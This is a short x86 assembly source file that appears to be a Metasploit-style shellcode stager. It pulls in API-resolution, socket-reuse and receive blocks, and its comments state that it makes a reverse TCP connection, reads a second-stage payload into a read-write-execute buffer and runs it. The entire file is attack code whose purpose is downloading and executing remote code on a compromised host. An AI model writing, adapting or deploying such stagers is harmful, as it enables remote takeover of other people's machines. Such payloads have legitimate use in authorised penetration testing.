[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "block_api.asm"
start:                   ;
  pop ebp                ; pop off the address of 'api_call' for calling later.
%include "block_reuse_oob_tcp.asm"
  ; By here we will have performed the reverse_tcp connection and EDI will be our socket.
%include "block_recv.asm"
  ; By now we will have recieved in the second stage into a RWX buffer and be executing it
